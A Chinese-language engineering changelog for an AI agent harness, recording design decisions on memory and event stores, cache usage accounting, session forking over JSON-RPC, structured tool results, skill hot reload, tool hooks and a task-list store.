**做出的改动与关键口径**：三层账本成型——`trace.jsonl`（机器流水，人复盘）→ `events.jsonl`（叙事精选，按需拉）→ `memory.md`（索引结论，每次推）。两条通道刻意分开：memory 是**推**（小而精、有条目才注入、2000 字符截断、`memory` 层按稳定度插在 skills 与 task 之间保住缓存前缀）；事件库是**拉**（`search_events` 命中才进当轮，limit 缺省 10 防灌爆）。两个 store 都照抄 TaskStore 的 C 方案（内存真相源 + 文件投影/种子 + render/parse 互逆、40 组属性测试），差异点各自刻意：记忆无清理语义（不过期）、无 onChange（无 UI 展示面就没有订阅方）；事件库 append-only（修正=追加，源码守护钉死不出现 writeFileSync）、内存索引运行期不回读。tool_call 的自动捕获**复用 span-collector 配对**（main.ts 第三个实例，capacity 0 落盘型），`recordToolCall` 把 CollectedSpan 映射成条目并带 `turnId`——事件库与 trace.jsonl 由此互指：库存结论与指针，trace 存全量过程，配对逻辑零重复。分工口径写进 core-section：一次性步骤归 todo，跨会话一句话结论归 memory，带来龙去脉的事件归 record_event。

**解决的问题**：跨会话记忆从零到一；"过去查得到"有了统一入口（模型 search_events / 人 /events）；工具调用历史不用记就有（自动捕获），叙事经验经 record_event 沉淀且四段齐全。

**未来可优化**：全局级长期记忆（`~/.flint/memory.md`，P9 待跟进）；事件库条目按 tags 升格进 memory 的手工流程可以再顺手（`/events` 已能看全量）；检索只在内存索引上做，外部手改文件要重启才可见（与 todo 同一口径，正确入口是工具与命令）。

---

<a id="log-2026-09-13-cache-usage"></a>

## 2026-09-13 | 缓存命中率明细：同一笔账拆个明细，总量口径一字不动

**牵连系统**：`llm/types.ts`（`LLMUsage` 加可选 `cacheReadTokens` / `cacheCreationTokens`）· `llm/anthropic.ts`（流式 `message_start` 捕获 + 非流式 `anthropicUsageToLLM` 两处解析点）· `llm/stream-helper.ts`（OpenAI 兼容吃 `prompt_tokens_details.cached_tokens`）· `loop/agent-loop.ts` 与 `runtime/runtime.ts`（两处累加点）· `runtime/events.ts`（usage 事件类型）· `commands/builtin/usage.ts` 与 `io/ui/tree-ui.ts`（展示）· `scripts/verify-cache-usage.ts`（新套件 21 项）。

**面向的问题**：缓存命中与否、占比多少，是调优提示词结构（系统提示与工具描述稳定前置）最直接的反馈信号，但 `LLMUsage` 只有三个槽——Anthropic 返回的 `cache_read_input_tokens` 被并进 promptTokens，账面只见总量、看不见"大头其实是 1 折价格的缓存读取"。

**做出的改动与关键口径**：明细是**服务端结算、本层只搬运**（缓存是否命中由 API 的缓存机制决定，程序不计算）。两条铁律：① **promptTokens / totalTokens 口径一字不动**——Anthropic 的 promptTokens 保持 input+cache_creation+cache_read 三者和、OpenAI 的 prompt_tokens 本身已含 cached_tokens，明细是同一笔账的拆解，不是第二笔账；② **API 没报就缺省，不伪报 0**（累加点守卫是 `!== undefined` 才加，全程无报字段不落）；③ /usage 展示条件同样是 `!== undefined` 而非 `> 0`——把"显示 0"的门关死在源码守护里（G5）。

**解决的问题**：`/usage` 与 usage 事件（UI ⚡ 行）现在能报"缓存命中 N tokens（占输入 N%）"与"缓存写入"，缓存命中占比从此可见。

**未来可优化**：OpenAI 兼容端若后续出现显式缓存写入语义，再补 cacheCreationTokens 的第三来源；`runtime/utils.ts` 的估算回退路径无缓存概念（估算本就是近似，不动）。

---

<a id="log-2026-09-12-fork-rpc"></a>

## 2026-09-12 | 会话分叉 RPC 化：编辑器拿得到 /history 的"从此继续"，内核零改动

**牵连系统**：`harness/rpc.ts`（分发表新增 `get_history` / `fork_session`、自定义错误码 -32001、`handleRequest` 导出）· `scripts/verify-fork-rpc.ts`（新套件）。**runtime / loop / context / session 一行未改**——分叉的全部内核面（`getHistoryMessages` / `forkSessionAt` / `forkSessionWithSummary`）本就是 Runtime 公开方法，缺的只是 RPC 这条分发线。

**面向的问题**：RPC 面原有 9 个方法，会话操作只有 list / switch / create / clear——TUI 里 `/history` 的"从此继续（fork）"与"带摘要从此继续"在编辑器侧没有对应物。P8 立项的目标是"让编辑器替我们做 UI"，而分叉恰恰是树形历史的招牌能力：不能分叉，编辑器侧的会话树就只剩一条直线。

**做出的改动**：

1. **`get_history`**：返回当前分支全量历史（含 `msgId` 与 `steer` 标记）——对端先靠它定位分叉点。**刻意不截断 content**（决策注释已钉）：编辑器要自己渲染"查看完整内容"，截断就得再开一条取全文的通道。
2. **`fork_session`**：单方法 + `summarize` 布尔开关，不拆成两个方法——分叉语义只有一种，摘要只是"复制完之后要不要顺手压缩前缀"（`forkSessionWithSummary` 的既有口径）。返回 `{ fileName, summarized, summary? }`。
3. **错误码语义**：缺 `msgId` / 非字符串 / **分叉点不存在**（先验 `getHistoryMessages` 里有没有这个 id）→ -32602 INVALID_PARAMS——不存在的分叉点是对端的参数错，不该穿透成 -32603 让人去猜；存储无 `forkTo` 能力 → **-32001 FORK_UNSUPPORTED**（JSON-RPC 服务端保留区间，对端按码分支，不必解析文案——TUI 对应物是那行 `❌ 当前会话存储不支持分叉`）。
4. **sessionId 同步**：分叉即切会话，`sink.setSessionName(fileName)` 让后续 `session/update` 通知挂对会话名——与 `switch_session` / `create_session` 同一纪律。
5. **`handleRequest` 导出**：分发逻辑是纯函数（runtime + sink 结构化注入），导出后行为证明不开子进程即可做（`verify-rpc-stream` 测映射层、本套件测分发表，`rpc-smoke` 继续负责真进程冒烟）。

**解决的问题**：编辑器 / 任意 JSON-RPC 客户端第一次具备完整的历史回溯能力（看历史 → 选点 → 分叉 → 带摘要分叉）；错误路径有了机器可判的语义（三个错误码各有其义）。

**未来可优化**：fork 出新分支后推一条 `session/update` 通知（当前只有响应，对端要自己记住"已切分支"）；`get_history` 分页（当前全量返回，超长会话可加 limit/offset）。

---

<a id="log-2026-09-12-tool-result"></a>

## 2026-09-12 | 工具结构化返回值：机器读 status、模型读 content，前缀退居展示层

**牵连系统**：`core/tools.ts`（ToolStatus / ToolResult / toolStatusFails 契约）· `tools/spec.ts`（五个返回值构造器）· `tools/registry.ts`（ToolInputError 就地转 invalid）· `loop/agent-loop.ts`（failed 判定）· `tools/builtin.ts`（7 个 handler 全部 return 点）

**面向的问题**：handler 返回裸字符串，"这次算不算失败"由 agent-loop 对前缀做 startsWith 解析（`[ERROR]` / `[VERIFY_FAILED]` / `[INVALID]` 三个）——**前缀是工具层与消费层之间唯一的协议**。两条后果：① 前缀拼错一个字母（`[ERORR]`）分类就静默漂移成"成功答案"，且没有任何机制会说话；② 新增一个状态（如第三类"有效否定"当年入场时）必须两头同时改，改漏一头就是静默错分类。2026-09-06 决策日志明确记过"结构化返回值这一步没做"，本轮补齐另一半。

**做出的改动**：

1. **契约**（`core/tools.ts`）：`ToolStatus` 五态（ok / negative / invalid / error / verify_failed）+ `ToolResult { status, content }`；`handler` 与 `ToolProvider.execute` 的返回契约一并改掉（不是旁路可选成员——旁路等于第二个协议，病根还在）。分类判定式**只有一份**：`toolStatusFails`（invalid/error/verify_failed 计失败，ok/negative 不计），消费方一律调它、不许重抄。
2. **生产端**（`spec.ts`）：五个构造器 `toolOk / toolInvalid / toolError / toolVerifyFailed / toolNegative` 是结构化返回值的**唯一入口**——status 是机器读的字段，content 由构造器统一拼前缀（handler 只写正文，`[ERORR]` 式拼错在构造器层就不可能发生）；`ToolNegativePrefix` 类型把有效否定限定在五个既有标识（NOT_FOUND/NOT_DIR/NOT_FILE/NO_MATCH/EMPTY），新前缀必须显式扩名单。
3. **消费端**（`agent-loop.ts`）：三行 startsWith 换成 `failed = toolStatusFails(result.status)`；三类失败的语义注释原样保留（① 硬失败 ② 无效输入计失败，③ 有效否定不计——把③当②会让模型每查一个不存在的符号都被念一次）。
4. **模型可见协议零变更**：content 与改前逐字节一致（前缀还在，模型看到的文本一字未动）——变的只是**机器通道**。会话历史、`tool_execution_end` 事件、Anthropic `is_error` 映射（`[工具` 前缀）、重复失败保护全部无需改判定逻辑或照旧工作。

**解决的问题**：分类从"解析文本"变成"读字段"；前缀拼错在构造器层被类型与测试共同拦住；新增状态时编译器逼着生产方表态、判定式逼着消费方表态——协议不再靠"人手把同一个词打对两遍"。

**刻意不做**：① 不做 `string | ToolResult` 联合类型的兼容层——那是把旧协议养在机器里当 dead code；scripts/ 下 17 处假 ToolProvider 全量迁移，一步到位。② 会话历史里不落 status 字段（历史回放侧的 `is_error` 仍靠前缀）——那是存储格式变更，等真实需求出现再立项。

**未来可优化**：`tool_execution_end` 事件把 status 一并带给 UI（当前事件只有 ok 布尔与文本）；技能/扩展自定义工具回归裸字符串的入口收口（`defineTool` 之外的手写 ToolDefinition 由 review 把关）。

---

<a id="log-2026-09-12-skill-deps"></a>

## 2026-09-12 | 技能依赖追踪：声明式依赖 + 双出口（提示词标注 / 热重载断裂提示）

**牵连系统**：`runtime/skill.ts`（`Skill.depends` + `parseDepends` + `getDependents` + `SkillChange.broken`）· `core/system-prompt.ts`（`SystemPromptContext` 加可选 `skillDeps`）· `runtime/runtime.ts`（构造 ctx 时随清单现取）· `context/sections/skills-section.ts`（标注依赖与缺失）· `io/ui/tree-ui.ts`（🔄 提示行追加「失去依赖」）· `scripts/verify-skill-deps.ts`（新套件）

**面向的问题**：skill.ts 挂着最后一个 TODO（addDependency / getDependents）。技能之间客观存在引用关系（一个技能的正文假定另一个技能已加载），但系统对此零感知：被依赖的技能被删/写坏，依赖方静默残废，用户与 LLM 两头都不知道。

**做出的改动**：

1. **声明**：frontmatter `depends: a, b` → 纯函数 `parseDepends`（逗号分隔、去空白、去重保序、非字符串值返回空数组）→ `Skill.depends`。
2. **反查**：`getDependents(name)` —— 对不存在的名字也可查（"谁声明了依赖它"与它是否存在正交）；`reload()` 的 broken 计算真实调用它（反向索引单一实现）。
3. **双出口**：提示词段标注「依赖 / 缺失」（`ctx.skillDeps` 可选成员，随清单每轮现取、自愈；静态悬空声明的暴露口）；TreeUI 热重载提示行对 `broken` 追加「⚠ x 失去依赖」（删除事件的暴露口）。

**解决的问题**：依赖断裂第一次可感知——删除被依赖技能时，UI 明说谁残废了；声明悬空时，LLM 每轮都看得到「缺失」标注。

**刻意不做**：`addDependency` 程序化注册——无运行期调用方的公开方法是「支持但未接线」债（本仓库已付三次学费），取舍见 [DECISION_LOG](./DECISION_LOG.md#log-2026-09-12-skill-deps)。

**未来可优化**：技能加载时递归展开依赖（先把被依赖技能正文带上）——等真实需求出现再说，当前标注已够 LLM 自行判断加载顺序。

---

<a id="log-2026-09-12-history-structured"></a>

## 2026-09-12 | 历史结构化数据接通：落盘归 runtime、请求侧按 thinking 分叉

**牵连系统**：`core/loop.ts`（AgentLoopResult 增 turnLog）· `core/storage.ts`（getMessages 读侧类型放宽）· `loop/agent-loop.ts`（turnLog 切片上交）· `runtime/runtime.ts`（落盘 turnLog + 请求侧分叉）· `llm/types.ts` / `llm/anthropic.ts`（权威注释同步）· `scripts/verify-history-structured.ts`（新套件）· `scripts/verify-session.ts` ⑨ 段 / `scripts/verify-steering.ts` S8 组（随新语义更新）

**面向的问题**：跨用户轮历史不带工具调用结构——模型看得到本轮调了什么工具，看不到上一轮的（中间消息从未落盘）；存储格式早就支持，但"入口没人写 + 出口被丢弃"构成双向死路。直接接通出口会让 `resolveAnthropicThinking` 安全阀把 extended thinking 静默全程关掉（thinkingBlocks 永不落盘，带 tool_calls 的历史 assistant 轮没有配对块可回放）。

**做出的改动**：

1. **turnLog 契约**（`core/loop.ts`）：`AgentLoopResult` 新增 `turnLog: LLMMessage[]`——run() 入口捕获 `startLen`，结束时 `toolMessages.slice(startLen)` 上交本轮**实际生成**的中间消息。落盘仍归 runtime（C3 断言"agent-loop 不碰存储"保持成立），引导/收尾提示对 tool 结果的原地追加因共享引用如实包含，最终回复不入 turnLog（runtime 已单独落盘）。
2. **落盘接线**（`runtime.ts`）：turnLog 逐条带 extra 落盘，顺序 user → steers → turnLog → 最终回复。`getMessages()` 契约读侧放宽（补三个可选结构化字段的类型声明）。
3. **请求侧分叉（方案 B）**：thinking 判定上移到组装之前；thinking 关（或 auto 未激活）→ 全量结构化回传；thinking 开 → 降级纯文本——**转写不是过滤**：tool 结果转 user 文本（`[工具 X 结果] …`）、纯工具调用的空 assistant 轮剔除（孤儿 tool 消息与空内容消息两条协议都不收——这个缺口是新套件 C5 首跑揪出来的）。安全阀原样保留当兜底。

**解决的问题**：模型跨用户轮看得到上一轮的工具调用与结果（thinking 关/auto 场景）；`/history` 与 fork 保留完整工具轮； thinking 场景不受影响（本轮循环内本就全结构化，历史降级保住 extended thinking）。

**未来可优化**：方案 A（thinkingBlocks 落盘 + 全量回放）留作增量——需要契约加字段、三存储后端、compaction 摘要交互对齐；steer 独立条目落在工具循环之前（runtime 只有"本轮内被吸收"一个时刻），真实时序由 tool 结果内嵌的 `[用户引导]` 文本承载，两份记录并存是刻意取舍。

---

<a id="log-2026-09-12-skill-hot-reload"></a>

## 2026-09-12 | 技能热重载：观察者只管 UI，提示词层自愈

**牵连系统**：`runtime/skill.ts`（SkillLoader）· `runtime/loader.ts`（Loader 基类）· `harness/main.ts`（装配）· `io/ui/tree-ui.ts`（通知线）· `scripts/verify-skill-watch.ts`（新套件）

**面向的问题**：skills/ 目录下的技能文件改动需重启进程才生效（skill.ts 躺着 startWatch/stopWatch TODO）；动手前必须回答上次 TaskStore 落地时登记的老问题——"把状态从文件搬进内存后，谁通知 UI"。另探针实锤一个静默 bug：装配传 `SkillLoader('skills')`、Loader 内部再拼一级 `'skills'`，实际扫描 `skills/skills/`（不存在），运行期技能数恒为 0，`skills/review.md` 从未进过 LLM 视野。

**做出的改动**：① `SkillLoader` 补 `startWatch`/`stopWatch`/`reload`/`onChange` 四件套——零依赖 `fs.watch`（`persistent:false`，不独自撑事件循环），事件防抖 300ms 合并，`reload` 算增删差后通知观察者（观察者异常隔离，fail-open）；watcher error 静默退场。② **通知问题的答案**：不需要"通知"——提示词层每轮 `systemPromptService.build` 现取 `getAll()`，内存清单一刷新 LLM 侧自动生效（与任务面板"每帧无条件重建"同一自愈范式）；`onChange` 观察者只服务 UI 提示（TreeUI 诊断区追加「🔄 技能已热更新」一行）。启动期 `load()` 不通知，通知只在热重载路径。③ 装配改传 `'.'`，`Loader` 基类抽 `dirFor()` 让 `scanFiles` 与 watcher 共用同一拼法。

**解决的问题**：技能改动即改即生效，不用重启；扫错目录 bug 修复后技能首次真正进入 LLM 视野。

**未来可优化**：依赖追踪（skill.ts 剩余 TODO）；RPC 模式未接技能变更通知（无消费者，刻意裁剪）；watcher 对"目录删了又建"不自动复活（显式 load 是恢复路径，已在 W25 钉住）。

---

<a id="log-2026-09-12-fork-summary"></a>

## 2026-09-12 | 分支摘要落地 + 压缩三连修

**结构变化**

- `core/compaction.ts`：`CompactionService` 契约新增 `compactNow(history, storage?, opts?)`（强制压缩，fork 摘要用），`maybeCompact` / `compactNow` 的 **storage 均改为每次调用传入**——服务无状态化，runtime 切会话后自动跟随（构造期绑死会把摘要写进旧会话文件，这是随本任务暴露的既有接线 bug）
- `context/compaction.ts`：抽出私有主体 `compactTo(storage, history, keep)`，`maybeCompact`（阈值闸 20）与 `compactNow`（强制，缺省保留 KEEP_RECENT=10）共用，行为与抽取前逐字一致；`CompactionDeps` 移除 storage
- `session/jsonl-storage.ts`：
  - `getMessages()` 增加**视图裁剪**——只端出"最后一个 compaction 的摘要 + firstKeptId 起的保留窗口"（此前注释声称裁剪、实现全量，压缩收益只活一轮）；审计层 `getAllStored` / `getAllMsgIds` 刻意不裁
  - `appendLine()` 统一在实体行后**落 leaf 标记**——文件最后一行永远是当前分支指针，重开重放即恢复（此前 leaf 只有 forkTo 写一次，fork 文件后续追加的内容重开即从视图消失）
  - `setLeafId()` 改直写落盘（不走 appendLine，leaf 不再被补一层；该方法目前零调用者）
- `runtime/runtime.ts`：新增 `forkSessionWithSummary(msgId)`（fork 后对新分支强制压缩）与私有 `compactionStore()` / `forkToStorage()`；`runSingleTurn` 的压缩调用改为传当前会话
- `commands/builtin/history.ts`：子操作菜单新增"带摘要从此继续"（`fork-summary`），长/短前缀两种回执文案
- `harness/main.ts`：压缩服务装配去掉绑死的 storage

**设计口径**

- 摘要触发 = **菜单选项**而非自动：fork 的既有立场是"复制的前缀 = 原线的忠实前缀"（审计性），摘要作为用户显式选择才不破它；文件里永远是完整历史，压缩只改"LLM 每轮看到的视图"
- 只认**最后一个** compaction（与 SystemPromptService 摘要层同一口径），更早的摘要被覆盖
- 前缀 ≤ KEEP_RECENT 条时不压缩（摘要短前缀没有收益），回执明说"等同普通分叉"

**守护**

- 新套件 `verify-fork-summary.ts` 52 项：F 视图裁剪回归（真存储）/ G compactNow 契约（真服务 + 探针 llm，含失败路径与 span 可观测）/ H Runtime 接线 + **leaf 持久化回归**（真 Runtime）/ I /history 源码断言 / J 源码守护（裁剪逻辑切片段断言防误伤注释、摘要 prompt 全库单一来源）
- 变异测试两轮：摘掉视图裁剪 → 12 条红；摘掉 leaf 落盘 → 4 条红（H4/H5/H14/H15）

---

<a id="log-2026-09-12-session-repo"></a>

## 2026-09-12 10:51 | 会话仓库层：单会话存储与会话管理分家，删除能力从无到有

**牵连系统**：`core/session-repo.ts`（新增，SessionRepo 契约）、`session/jsonl-repo.ts`（新增，Jsonl 实现）、
`session/jsonl-storage.ts`（摘走 listAll 与文件名识别）、`core/storage.ts`（可选成员 +getFilePath）、
`runtime.ts`（四方法委托 + deleteSession + 守卫）、`harness/main.ts`（装配注入）、
`commands/builtin/sessions.ts`（删除流程）、`scripts/verify-repo.ts`（新增 51 项）、
`scripts/verify-session.ts`（一条断言的语义更新）。

**面向的问题**：改造前"会话管理"散在两处——`JsonlSessionStorage` 的静态方法（listAll/open/create）
与 `runtime.ts` 的私有方法（文件名规范化、目录推导），而"单会话存储"（entry 树 / leaf / compaction）
与"目录里有哪些会话文件"是两类职责，混在一个类里导致：runtime 要 import 具体类而非依赖契约；
文件名规范化逻辑在 runtime 复制一份；且**全项目没有删除会话的入口**（fork 出的废线只能手工进
文件系统删）。

**做出的改动**：
- 分家：目录级操作收进 `SessionRepo` 契约（core 层，与其他 9 个子系统接口同列）+ Jsonl 实现。
  `listAll` 整体搬走、`jsonl-storage` 不再认目录；`create` 返回 `{fileName, storage}`（此前调用方
  要自己拼一遍文件名才能知道建了哪个）。
- 删除能力两层守卫：repo 层 `isRemovableSessionName` 白名单（拒路径分隔符与 `..`，堵路径穿越）；
  Runtime 层拒删**当前活跃会话**——否则 `this.session` 指向已 unlink 的文件，后续 append 静默丢
  消息。UI 层再加一道 disabled（三层里 UI 只是提示，真正承重的是 Runtime 守卫）。
- 守卫比对用 `getFilePath` **可选成员探测**而非 instanceof（core/storage.ts 新增该可选成员）——
  与 storage.ts 注释里那段收敛史同一立场：Runtime 不缩窄到具体类。InMemory/Mock 无此成员时
  守卫跳过、不误伤。
- `RuntimeOptions.sessionRepo` **可选注入**，缺省回退旧静态路径（mock / 兼容场景不强迫依赖新契约）；
  回退的 listSessions 临时建 repo 委托——列表逻辑全库仍只一份。

**解决的问题**：会话管理依赖契约而非具体类（可替身、可换实现）；删除从无到有且带穿越防护；
"列表怎么排、坏文件怎么办"这类目录级判断有了唯一落点。

**未来可优化**：repo 的 `list()` 逐文件 `open` 只为数消息数，会话多了之后可换成只读 header 行的
轻量统计；`switchSession` / `createSession` 目前只换存储不通知 UI（TreeUI 的 banner 消息数靠
下次请求刷新），若将来面板要实时跟随会话切换，需要补一条 onChange 型通知线——"把状态从文件
搬进内存必须回答谁通知 UI"的教训在这里同样适用。

---

<a id="log-2026-09-12-tool-hooks"></a>

## 2026-09-12 00:00 | 工具生命周期钩子：程序闸先于人闸，可拦截不可改参

**牵连系统**：`loop/agent-loop.ts`（两个发射点）、`loop/tool-hooks.ts`（新增，deny 契约解码）、
`extensions/hooks/example-hook.ts`（示范扩充）、`scripts/verify-hooks.ts`（新增 35 项）、
`scripts/verify-extensions.ts`（一条断言的前提修正）。

**面向的问题**：钩子机制此前只有半个——`emitHook` 管道与 `before_build`/`before_request` 两个提示词层
挂点都在，但工具执行这条最该有闸的路径上没有任何挂点，"改完自动跑测试""危险命令拦截""工具级审计"
都没有落点。且工具执行点全项目唯一（`agent-loop.ts` 一处 `tools.execute`），不加闸则任何扩展都只能
在工具**外面**包一层（那就得改装配，违背"扩展不改 core"）。

**做出的改动**：
- 两个发射点：`before_tool_call`（`tools.execute` 之前、权限弹窗**之前**——程序闸先于人闸，钩子拦下的
  调用人根本看不到弹窗）与 `after_tool_call`（`tool_execution_end` 之后，载荷含
  `{name, args, result, ok, durationMs}`，**只读**，返回值不消费）。命名跟随项目既有的 kebab 风格
  （`before_build`），不用 Pi 的 camelCase。
- deny 契约解码收在**纯函数** `decodeDeny`（`loop/tool-hooks.ts`）：`{action:'deny', reason?}` → 拦截；
  undefined / 非对象 / 未知形状 → 放行。**fail-open** 是刻意取向：钩子是基础设施不是策略，
  它写错了不能让所有工具调用集体瘫痪；异常与形状不对都只记 stderr（不占 stdout 协议通道）。
- 被拦截的调用与权限拒绝同构：给模型一条 `[工具 X 被钩子拦截]：理由` 的 tool 结果 +
  `tool_execution_end(ok:false)` 事件，循环继续——**不掀翻轮次**。

**解决的问题**：工具级扩展有了正式挂点（示例钩子现已示范审计 + 拦截两个用法）；"程序闸先于人闸"
还省掉了"弹窗问了半天、钩子反正要拦"的浪费。

**未来可优化**：消息生命周期钩子（LLM 请求前后的用户级挂点）未做——`before_request` 是
system-prompt 内部的，对 extensions 开放的只有工具这两个；`runtime.onInput()` 依旧空着；
deny 目前不进 `repeatTracker`（与权限拒绝一致），若将来发现模型在同一个被拦调用上反复重试，
再考虑把拦截也计入重复失败保护。

---

<a id="log-2026-09-11-rpc-stream"></a>

## 2026-09-11 20:43 | 把内核的自言自语递出进程：RPC 流式通知与 stdout 纯净

**牵连系统/层次**：编排层 `harness/`（rpc.ts、新增 rpc-events.ts）、运行时 `runtime/`（事件总线）、
`loop/`、`context/`（stdout 纪律）。**内核、UI、事件总线本身一行未改。**

**面向的问题**：内核一直在自言自语——23 种事件在进程内广播，TreeUI 与 TerminalUI 都在听，
但 RPC 模式**一个订阅者都没有**（`grep subscribe src/harness/rpc.ts` 零命中）。
于是编辑器插件只能 `await` 完整个 `prompt()`，中间几十秒完全黑盒，最后蹦一行结果。
`rpc.ts` 第 12 行的 `text_delta` TODO 从立项挂到现在。

**做出的改动**：

1. **补第三根订阅线**。chat 期间 `runtime.subscribe()`，收到事件立即映射成
   `session/update` 通知写出；**订阅只活在这一轮 chat 内**，`finally` 必退订。
   照抄的正是终端那条路（`tree-ui.ts:362` / `io/ui/index.ts:121`），未新造机制。
2. **映射表独立成一个模块**（`src/harness/rpc-events.ts），**纯函数 + 极少量配对状态、不碰 stdout**。
   这是全部的设计工作量，也是唯一能不开进程就测的部分。
3. **形状分两类**：片（chunk，对端累加）与离散（discrete，对端换状态）。
   混成一种，对端就无从判断"这行是拼到上一条后面，还是一条新东西"。
4. **过滤也是映射的一部分**：15 种内部记账事件（span / note / 自检）一律不外发。
5. **stdout 纯净立为硬规矩**：`rpc.ts` 成为唯一写 stdout 的地方，写入收敛进
   `writeLine` 并**串行排队**（`stdout.write` 是异步的，不排队会乱序）。

**解决的问题**：外部程序现在能看见"正在发生什么"——正在等待、正在跑哪个工具、正文逐字到达。
而这让"让编辑器替我们做 UI"从设想变成了可接线的事：flint 的传输层与 ACP 同源，
字段名也已用规范真名，将来全量对齐只差一层壳。

**两个当时没料到的发现**：

- **内核的工具事件没有 id**。`tool_execution_start/end` 类型里就没有 id 字段，
  而 ACP 的 `tool_call` / `tool_call_update` 必须靠 `toolCallId` 配对。
  span 层的 `tool_call_start/end` 虽有 `spanId`，但**全 `src/` 从没被发射过**（只有类型定义），
  指望不上——只能由映射表自己发号。
- **`usage` 无处安放**。ACP 里用量属"一轮的结果"，应进 `session/prompt` 的响应；
  但本版 `chat` 的 result 仍是字符串（保持与既有客户端兼容），故暂不外发，
  留到全量对齐时随 `result: { stopReason, usage }` 一起改。

**未来可优化**：① 背压策略未做（本地管道很少触发，代码里已注明是已知缺口）；
② 通知目前无条件推送，原本计划的"实验开关"未做（尚无真实外部消费者）；
③ ACP 全量对齐（权限请求 / 文件读写 / 终端）是独立可切的小块；
④ 并发 chat 目前直接拒绝，若要支持需给事件加上请求归属（事件里有 `turnId` 可借用）。

---

<a id="log-2026-09-11-task-panel"></a>

## 2026-09-11 18:10 | 任务清单上屏：给内存真相源补上"通知 UI"那根线

### 牵连系统 / 层次
`src/todo/store.ts`（任务清单真相源）、`src/io/ui/`（交互层，新增 `task-panel.ts`）、`src/commands/builtin/`（新增 `tasks.ts`）

### 面向的问题
上一块（[C 方案](#log-2026-09-11-todo-store)）把任务清单的真相源从 `TASK.md` 搬进了内存 `TaskStore`，
换来了结构与不变量，但也暴露出一个此前被"文件"掩盖的缺口：

**真相源搬进内存后，没人通知 UI。** `todo` 工具改完 `TaskStore` 就结束了——它拿不到事件总线
（`registerBuiltinTools` 只收 `ToolProvider` 与 store），也没有任何事件可发。改造前这个问题不存在，
因为"文件"天然是个可被任何人事后去读的公共物；内存状态没有这个性质，读它必须先被通知。

后果是具体的：`src/io/` 与 `src/commands/` 里 "task" **零命中**——清单对模型和磁盘都可见，
唯独用户面前的屏幕上一个任务都没有。

### 做出的改动

1. **`TaskStore.onChange()` 观察者（零依赖）** —— 只是一个 `Set<() => void>` 回调集合，
   **不引入事件总线**。为什么不走总线：那会把 `todo/` 拖进 runtime 的依赖圈，而这个目录的立身之本
   是"零依赖 + 纯数据结构"。观察者让 store 不必认识"UI"是什么，反过来由 UI 去 import store。
   配套约定：被拒绝的操作（空文本的 `add`、越界的 `start`/`done`）**不通知**——状态没变就不该重绘。

2. **常驻任务面板**（`io/ui/task-panel.ts`）—— 输入框正上方，完成 `✓` / 进行中 `▶` / 待办 `☐`。
   渲染是**纯函数**（收 `TaskItem[]` 与 width、返回 `string[]`），不知道 `Screen` 是什么，
   于是"清单长什么样"可以脱离终端单独验。
   进行中单独用实心三角而不是空框：它确实"没完成"，但和"还没轮到"不是一回事，压成同一记号就丢信息。

3. **`/tasks` 命令 + `lastCompleted()` 快照** —— 面板"空清单零行即收起"的代价是：清空后当前快照查不到，
   而 TASK.md 又因"全勾选即删"被删了。快照就是那个回看入口。
   **记录时机是"最后一项被 `done` 的那一刻"**，不是"清空时"——否则半途被 `clear` 掉的清单
   也会被当成"已完成"存进来。`clear()` 故意不清快照；另加 `reset()` 供测试擦掉单例
   （顺带补上一个注释里早就提到、实现里却没有的方法）。

4. **排版收敛成唯一实现** —— `static renderItems(items, numbered)` 成为全项目唯一的清单排版处，
   `render()` / `renderNumbered()` / `/tasks` / 终端面板全部走它。glyph 只有 `GLYPH` 一处定义，
   杜绝"磁盘上写 `[x]`、终端上画成别的"。

### 解决的问题
- 模型勾完一项，屏幕**立刻**跟着变（此前完全不会动）。
- 全部完成 → 面板自动收起，屏幕不留残余；需要回看时 `/tasks` 给出上一轮的完整清单。
- 命令输出与终端面板共用同一套记号，但**命令版不带 ANSI**——返回值会经 RPC / 非 TTY 通道出去。

### 未来可优化
- 面板目前**只显示不交互**（无鼠标支持，`input-handler.ts` 里 mouse / SGR 1006 零命中）。
  要可点击得先摸清 Windows Terminal / ConPTY 的鼠标协议支持度，别盲写。
- 更根本的方向是**让别人家的编辑器替我们做 UI**：`harness/rpc.ts` 已经是 JSON-RPC 2.0 over stdio，
  与 ACP（Agent Client Protocol）同构，只差把流式 notification 补上。那是另一个议题，本轮未动。

<a id="log-2026-09-11-todo-store"></a>
## 2026-09-11 14:56 | 任务清单从"文件即状态"升级成"工具即状态"：TaskStore 做真相源、TASK.md 降为投影 + 种子

**牵连系统 / 层次**：状态层（新增 `src/todo/store.ts`：`TaskStore`）· 工具层（`tools/builtin.ts` 新增第 7 个内置工具 `todo`）· 运行时层（`runtime/runtime.ts` 删 `loadTaskMemory`、改读 store；`harness/main.ts` 启动时 `loadFromFile` 种子）· 提示词层（`context/sections/core-section.ts` 的【工作记忆】、`context/system-prompt.ts` 的 `hasUncheckedTask` 与续传提示）· 循环层（`loop/agent-loop.ts` 收尾提示）· 验证层（新增 `scripts/verify-todo.ts`；改 `verify-c2` / `verify-spec` / `verify-edit` / `verify-phase-ab` 与基线 fixture）· 文档层（TESTING / 目录 / ARCHITECTURE / GLOSSARY / ROADMAP / 三份追加日志）

**面向的问题**：
- 改造前是"文件即状态"：模型用 `write` 维护 `TASK.md`，harness 用一个正则（`hasUncheckedTask`）数复选框。三个真实弱点：① `write` 是**全量覆盖**，改一个勾要重抄整份清单——正是本项目点名警告过的那类动作（`edit` 的存在理由就是"重抄会误伤"）；②"结构"只是一个正则，没有 id、没有顺序保证、没有"同一时刻只有一个进行中"这类不变量，护栏能读到的只有一个布尔；③模型可以**谎报完成**且无人核对——那次"更新"根本不经过工具，不留调用记录、进不了 `/traces` 与 `/history`。
- 深一层的动机：思维链（CoT）发生在模型的一次生成里，harness 看不见、也拿不到。任务列表的价值就是**把这条易失的链外化成一个物件**，让运行时能读它并据此决策（flint 早就在做：用 TASK.md 是否存在决定轮数预算与 thinking 开关）。所以问题不是"要不要外化"，而是"外化成**文件**还是**工具**"。

**做出的改动**：
- **`src/todo/store.ts`（新，零依赖）**：`TaskStore` = 清单的**内存真相源**。`add/start/done/clear` 做增量变更；`start` 会把其它进行中项降回 pending（**唯一 active 不变量**）；`render()` 与 `static fromMarkdown()` **严格互逆**（写盘 / 读盘是一对逆运算）；`loadFromFile` 做启动种子、`projectToFile` 做投影。进程级单例 `taskStore`：tool 与 runtime 自动共享同一份状态。
